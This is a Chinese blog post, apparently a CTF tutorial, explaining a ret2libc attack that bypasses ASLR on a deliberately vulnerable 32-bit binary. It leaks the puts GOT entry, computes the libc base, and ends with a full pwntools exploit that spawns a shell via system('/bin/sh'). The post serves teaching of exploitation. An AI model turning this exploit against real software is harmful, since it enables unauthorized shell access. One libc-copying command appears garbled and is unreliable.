---
title: ret2libc攻击技术示例-泄露libc基地址计算system()地址绕过ASLR
tags: [CTF, pwn, rop]
layout: post
categories: tutorials
---

## 情景描述

随着保护的加强，比如加入了`ASLR(Address Space Layout Randomization),地址空间格局的随机化`保护，这时我们所获取的各个函数地址都在变化中变得不再可用（在本地我们可用），这时我们还要使用libc中的system()函数获取shell的话，那我们该怎么办呢？

其实`ASLR`在随机化过程中，只会改变libc的基地址，对于libc中各个函数的偏移是不会改变的，因此只要我们泄露内存中的`libc基地址`那么我们就能够根据偏移得到system()函数地址。

当然我们本地是可以关闭`ASLR`保护的，只需要在终端执行以下命令
```bash
sudo -s
echo 0 > /proc/sys/kernel/randomize_va_space # 2 - trun on
exit
```

## 漏洞分析

本节示例的漏洞代码可以在此处下载： [ret2libc3](http://od7mpc53s.bkt.clouddn.com/ret2libc3) & [libc.so.6](http://od7mpc53s.bkt.clouddn.com/libc.so.6)
当然这里的libc.so.6最好是用自己系统的。我们可以通过`ldd`命令查看

``` bash
➜  ret2libc3 ldd ret2libc3
	linux-gate.so.1 =>  (0xf77da000)
	libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xf7605000)
	/lib/ld-linux.so.2 (0x565eb000)
```

我们可以通过`sudo /lib/i386-linux-gnu/libc.so.6 .`获取合适的libc。否则的话，在本节中会出现无法拿到shell的情况哦。

我们用IDA反编译一下可以看到

``` c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v4; // [sp+1Ch] [bp-64h]@1

  setvbuf(stdout, 0, 2, 0);
  setvbuf(stdin, 0, 1, 0);
  puts("No surprise anymore, system disappeard QQ.");
  printf("Can you find it !?");
  gets((char *)&v4);
  return 0;
}
```

我们要怎么获得libc中某函数的地址呢？我们一般采用的方法就是泄露got表。因为linux的延迟绑定，我们需要选择至少执行过一次的函数进行泄露，比如这里的`puts()`

通过泄露`puts()`在libc中的偏移，再结合`puts()`的实际内存地址，我们可以这样进行计算：
``` python
system_addr - libc_system = puts_addr - libc_puts
system_addr = puts_addr + (libc_system - libc_puts)
```
即system()的内存地址为puts()的内存地址再加上两个函数在libc中的偏移差

那么

``` bash
➜  ret2libc3 objdump -dj .plt ret2libc3 | grep -E "puts|system"
08048460 <puts@plt>:
```

## 攻击代码

``` python
from pwn import *

#context.log_level = 'debug'

elf = ELF('ret2libc3')
libc = ELF('libc.so.6')


plt_puts = elf.symbols['puts']
got_puts = elf.got['puts']
plt_main = elf.symbols['_start']

libc_system = libc.symbols['system']
libc_puts = libc.symbols['puts']

payload = 'A' * 112
payload += p32(plt_puts) + p32(plt_main) + p32(got_puts)

io = process('ret2libc3')
io.recvuntil('Can you find it !?')
io.sendline(payload)

temp = io.recv(4)
puts_addr = u32(temp)
print "[+] puts() address: " + hex(puts_addr)

libc_base = puts_addr - libc_puts
print "[+] libc base address: " + hex(libc_base)

system_addr = libc_base + libc_system
print "[+] system address: " + hex(system_addr)

bin_sh_addr = libc_base + next(libc.search('/bin/sh'))
print "[+] /bin/sh address: " + hex(bin_sh_addr)

payload = 'A' * 112
payload += p32(system_addr) + p32(0xdeadbeef) + p32(bin_sh_addr)

io.recvuntil('Can you find it !?')
io.sendline(payload)
io.interactive()

```
